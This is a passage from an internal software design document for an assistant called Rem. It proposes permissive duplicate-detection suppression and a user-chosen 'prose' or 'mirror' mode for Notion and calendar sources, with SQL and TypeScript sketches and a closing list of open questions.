inside a dedup engine is a disaster — permissive merging is precisely how one meeting ends up hiding
another. The *same* permissive matcher inside a detector is the safe setting, because the only thing
it can over-do is stay quiet. Identical fuzziness, opposite consequence, entirely because the output
is a sentence.

So the two sides are tuned differently:

| | predicate | tuning | worst case |
|---|---|---|---|
| suppress the sentence | "some Rem object plausibly corresponds" | **permissive** — normalized-title equality **or** normalized containment either way, within the window | a gap Rem never mentions |
| emit the sentence | the above found nothing | **strict** — only on a clean miss | one redundant line |

Containment ("Design review" vs "Design review — Q3 deck") is included on the *suppressing* side
only, and is safe there for the same reason: a false suppression costs silence. It must never be
promoted into a matcher, because the moment its output selects a row instead of setting a flag, it
becomes `findEventID` with a wider net.

**No confidence score, no second tier that speaks.** A looser tier whose job is to emit is how a
detector turns back into a matcher: it needs to rank, ranking needs a winner, and a winner is an id.
Loosening is allowed only in the direction of saying less.

**Which way to tune it on evidence.** Widen the suppressor (say less) when users report the sentence
as redundant. Narrow it (say more) when users report that Rem never notices gaps. Those two
complaints are distinguishable in feedback and not in the data, which is why this needs users rather
than a threshold sweep.

### When it is wrong

Both directions cost a sentence. Neither costs a silent merge — that is the whole return on the
design.

| direction | what the user sees | cost | recovery |
|---|---|---|---|
| **false "not here"** — Rem says an item is missing when a Rem task already covers it (provider rewrote the title, user typed it differently) | one redundant line: *"you're tracking X in Notion but not here"* | Rem looks like it isn't paying attention. If the user acts on it, **one duplicate row** — created in the foreground, by the user, in one visible step, deletable | the user replies "I already have that", or deletes the row they just asked for |
| **missed duplicate / false "already here"** — Rem stays quiet about an item it should have flagged (titles collide, or the item genuinely has a counterpart) | nothing; the item goes unmentioned | one less useful sentence. The item is still in Notion/GCal, which the user opens anyway; a live read at question time still returns it | the user asks Rem directly, and the live read answers |

**The asymmetry runs the opposite way to the merge engine's, which is the point.** A dedup engine's
worst case is a wrongly merged meeting — silent, durable, discovered afterwards, caused by the
assistant. Detection's worst case is a wrong sentence, and its second-worst case is one duplicate row
that the user personally asked for while looking at the reason. Neither is a class of failure the
user finds out about too late.

**Which is why the predicate leans toward silence.** A missing sentence costs the user nothing they
had. A wrong sentence costs credibility on the surface Rem is judged by, and is the only one of the
two that can end in a row.

---

## Rem already ships a mirror. Copy that pattern.

This is not a new concept for the codebase. The iOS app already implements exactly this policy for
device calendar events, down to the name:

```swift
isCalendarOnlyMirror: true   // AgendaViewModel.swift:597
```

| property | where | why it matters |
|---|---|---|
| find-or-create on the source id | `AgendaViewModel.swift:569-604` | never two mirrors for one event |
| **never synced to the backend** | `TaskSyncManager.swift:39`, `TaskStore+TaskStoreProviding.swift:59` | the server never holds a copy it would have to reconcile |
| **dies when the source event dies** | `AgendaViewModel.swift:148-151` — shown only while its id is still in `currentCalendarEventIDs` | no orphan can outlive the thing it mirrors |
| **promoted on user action** | `isCalendarOnlyMirror = false` at `TaskSyncManager.swift:93` | the user's intent, not an ingester, is what makes Rem own it |

That third row is the definition worth generalizing: **a mirror has no independent life.** An
ingested copy does, which is precisely why it can drift, duplicate, and outlive its source.

**Caveat: this pattern is iOS-only today.** `RemClawMac/` contains none of it — 0 hits for
`isCalendarOnlyMirror` / `calendarEventID` against 14 Mac files mentioning `Calendar` as a control.
Any Mac surface that shows mirrored objects has to build it, and shared-view work under the DRY rule
should assume the protocol needs widening.

This pattern works *because it never needed cross-system identity*. It keys on one system's id,
inside that system's boundary. Every property that makes it safe is lost the moment two systems are
involved — which is the same conclusion the identity analysis reaches from the other direction.

**So the design is: extend an existing, shipped, working pattern to remote mirrors.** Not build a
new subsystem. (CLAUDE.md principle 1 — the pattern to mirror was in our own repo.)

---

## The hybrid preference

**Shape.** One question, per connected hybrid, asked at connect time — not a settings page nobody
opens. This is *not* the withdrawn "refuse the duplicate at connect time" advice wearing a new hat:
it never declines a connection and never declines a read. It asks how much authority the user wants
to grant the write path, and both answers leave Rem watching.

> **Notion has tasks in it. Want Rem to keep them alongside your Rem tasks, or just talk about them
> when relevant?**
> `Just talk about them` (default) · `Keep them in Rem`

**Values.** `prose` | `mirror`. Two, not three — "off" is disconnecting the toolkit, which already
exists.

**Neither value stops Rem reading.** `prose` means *watch and describe*; `mirror` means *watch,
describe, and keep rows in step*. There is no value that means "don't look", because a source Rem
does not read is a source Rem cannot mention, and mentioning is the floor. This is what the
refinement at the top of the document changed: the preference now governs the **write**, and both
settings leave the read on.

**`mirror` is a standing authorization, not an exception to rule 3.** It is the user asking once,
up front, for a whole source, instead of item by item in chat. Both routes are the user asking;
they differ only in granularity. Nothing in either route lets Rem decide on its own.

**Default is `prose`, and the reason is reversibility, not taste.** `prose` → `mirror` creates rows.
`mirror` → `prose` must *delete rows Rem created*, which requires provenance on every row so the
cleanup can tell them from the user's own. Defaulting to the mode with no cleanup obligation means
the off switch is never a data-deletion problem. Defaulting the other way makes turning the feature
off the most dangerous operation in the product.

**Scope: the mirror half only.** A Notion mention is a signal and ingests under either value.

**Where it is stored.** There is no `user_preferences` table — verified by enumerating every
`CREATE TABLE` in `backend/src/db/migrations/`. So this needs a small new one:

```sql
CREATE TABLE connector_source_prefs (
  user_id    UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  source     TEXT NOT NULL,          -- registry `source`, not toolkit slug
  mode       TEXT NOT NULL CHECK (mode IN ('prose', 'mirror')),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  PRIMARY KEY (user_id, source)
);
```

**An absent row means `prose`.** No backfill, no migration when a hybrid is added, and a user who
never answered is in the safe mode by construction — the same derived-state discipline as
`relevance_decision IS NULL` meaning "not judged" in migration 118.

Keyed on `source`, not `toolkitSlug`, because a hybrid registers under more than one source (below)
and only one of them is governed by the preference.

---

## What changes in `connector-signals.registry.ts`

Sketch, not implementation.

### The hazard to avoid

The obvious move — add `kind: 'signal' | 'mirror' | 'hybrid'` to `ConnectorSignalDescriptor` and put
mirrors in the same `DESCRIPTORS` array — **silently breaks three existing consumers**, because
`listDescriptors()` does not mean "sources we know about". Its docblock (`:309-313`) says a row is
`coming_soon` *precisely when no descriptor claims its source*, and its consumers read it as "sources
the poller reads":

- `ingest-signals.ts:53` — `const descriptors = [...listDescriptors()]`, then polls every one.
- `automation-inputs.service.ts:255-261` — `deriveConnected()`; a mirror descriptor would make the
  Automations UI tell the user "Connected — Rem reads Google Calendar for your brief". It does not.
- `signal-ingest.service.ts:327` — resolves ACTIVE Composio accounts per `toolkitSlug`.

Adding a mirror to that array is how the taxonomy gets undone by the type it was added to.

### The shape instead

Make the taxonomy a *type* distinction, so "ingest a mirror" is unwriteable rather than merely
discouraged:

```ts
export type SourceKind = 'signal' | 'mirror';

interface SourceDescriptor {
  source: string;
  toolkitSlug: string;
  displayName: string;
  kind: SourceKind;
}

// unchanged in every existing respect, now explicitly narrowed
export interface ConnectorSignalDescriptor extends SourceDescriptor {
  kind: 'signal';
  action: string;
  actionVersion: string;
  buildQuery(windowStart: Date, windowEnd: Date): Record<string, unknown>;
  mapItem(raw: unknown, connectedAccountId: string): NormalizedSignal | null;
}

// no buildQuery, no mapItem, no NormalizedSignal — a mirror has nothing to ingest
export interface MirrorSourceDescriptor extends SourceDescriptor {
  kind: 'mirror';
  /** Read live at question time. Never persisted. */
  readAction: string;
  readActionVersion: string;
}
```

`MirrorSourceDescriptor` having no `mapItem` is the point: there is no way to express "turn this
into a `channel_signals` row", so no future agent can accidentally do it.

**`readAction` is the watch path, and it is why this type survives the refinement unchanged.** The
mirror descriptor was already read-capable-but-not-write-capable: it carries the action Rem calls to
*look*, and nothing that turns what it sees into a row. That is exactly the asymmetry the founder's
model asks for, so the sketch needs no revision — only the note that `readAction` is now a
**required** part of the design rather than an optional convenience. A mirror descriptor with no
`readAction` is a source Rem cannot describe, which is the failure mode this whole document is
about.

**`listDescriptors()` keeps its name, its return type, and its exact meaning** — signal descriptors
only. Zero changes at all three call sites. A new `listSources(): readonly SourceDescriptor[]`
serves anything that wants the full catalog.

**Hybrids register twice**, under two different `source` strings sharing one `toolkitSlug`:

```ts
{ source: 'notion-mentions',  toolkitSlug: 'notion', kind: 'signal' }
{ source: 'notion-work-items', toolkitSlug: 'notion', kind: 'mirror' }
```

The distinct `source` strings are forced, not stylistic: `channel_signals` is unique on
`(user_id, source, source_ref)` (migration 039:34) and the registry throws at module load on a
duplicate `source` (`:298-303`). One string cannot carry two kinds.

### Relationship to schemaless ingestion

The product decisions already established that per-connector descriptors don't scale and all connectors should be
ingestable by default. **This doc does not reverse that — it gates it.**

Those two answer different questions. Schemaless ingestion answers *"how do we read arbitrary
provider JSON without hand-writing a `mapItem` fifteen times"*. The taxonomy answers *"should we
ingest this source at all"*. They compose: a schemaless ingester pointed at every toolkit including
the mirrors produces duplicates faster and more uniformly than fifteen hand-written descriptors
would. The `kind` field is what a general ingester reads to know which toolkits are its business.

---

## What this does not change

Four constraints are already decided and nothing here touches them:

- **Timed or invisible.** A task needs a due time or it stays in the hidden inbox. A promoted mirror
  object arrives with the source's time, so it satisfies this by construction.
- **No subtask table.** A payload inside the parent task is the container.
- **A task is an agent owning an area.** That framing is the rationale for aggregating several
  mirrored items under one task rather than filing one task per remote row.
- **The relevance floor survives.** `UNIVERSAL_PRIORS` / `UNIVERSAL_NEGATIVES`
  (`signal-relevance.service.ts:411-427`) are unconditional, so a brand-new user with no tasks still
  gets suggestions. Mirrors do not enter that path at all, so there is nothing here that could
  weaken it.

---

## What I could not determine

Stated plainly, so nobody reads confidence into it that isn't there.

**From this revision (the watch / prose / user-initiated-sync model):**

- **Everything in "What the detection signal is" is a proposal, not a measurement.** The predicate
  shape is copied from a shipped one (`suggestions.service.ts:314-318`); the *thresholds* — local-day
  window, normalized-title equality, no fuzzy second tier — are reasoned from failure cost, not
  tuned against data. Nobody has run this over a real Notion or Google Calendar account, so the
  false-"not here" rate is unknown. It is a starting point chosen to be safe when wrong, and it
  should be revised the first time somebody measures it.
- **Whether the authoring model reliably produces the sentence at all.** The prose is written by the
  user's own gateway agent from a prompt, not by a template. Handing it a boolean does not guarantee
  it renders "you're tracking this in Notion but not here" rather than silently folding the item into
  the day. That is a prompt-behaviour question and needs a live authoring run to answer; I did not
  do one.
- **Whether users will reply to the brief to ask for a sync.** The recommendation against an
  on-prose affordance is argued from code structure and from #875's precedent, not from anyone
  watching a user. The named risk — the user does not realise a reply is possible — is real and
  untested.
- **Whether reading every connected mirror on every brief cycle fits the budget.** `collectConnectorSignals`
  enforces caps for signal sources (`CONNECTOR_SIGNAL_BOUNDS`); a live mirror read at authoring time
  is a new caller and I did not cost it. Mirror reads are *live*, so a slow provider delays a brief
  rather than corrupting one — but "how slow" is unmeasured.

**Carried over, still unresolved:**

- **Whether Composio's Google Calendar action exposes `iCalUID`.** No payload has been captured, and
  I did not call the provider. The registry records the same unresolved question for Gmail's own
  action (`connector-signals.registry.ts:262-286`), where guessing cost two full silent zero-row
  ingests (`:279`).
- **Whether `EKEvent.calendarItemExternalIdentifier` actually equals Google's `iCalUID` for a Google
  account synced to iOS.** That is an empirical claim about Apple's CalDAV client. It is widely
  true; I did not test it on a device, and I was not going to assert it from memory.
- **How many of the founder's own calendar events arrive via Google-synced device calendars vs
  iCloud.** Answering it means reading his device or a live database. I did neither.
- **Whether Discord currently produces any signals.** It is in `COMPOSIO_TOOLKITS` (`:97`) and
  `channels.service.ts` models it as a provider, but `DESCRIPTORS` contains only
  `gmailSignalDescriptor` (`connector-signals.registry.ts:383-385`) and the gateway
  `message_received` hook was never built (`signal-ingest.service.ts:6-10`). So "Discord is
  connected" does not currently mean Discord signals arrive. Discord's classification as a signal is
  correct and unaffected; its plumbing is a separate gap.
- **The live relevance counters** (judged / act / drop on the founder's inbox) come from his report,
  not from anything I measured. I did not touch a database. The code backing them is on staging
  (`signal-relevance.service.ts`, migration 118).
- **Todoist and Asana as mirrors** is inference from the classifying test, not from reading their
  action payloads. They are in the catalog (`composio.service.ts:105-106`) and hold task-shaped
  objects; nobody has integrated either.
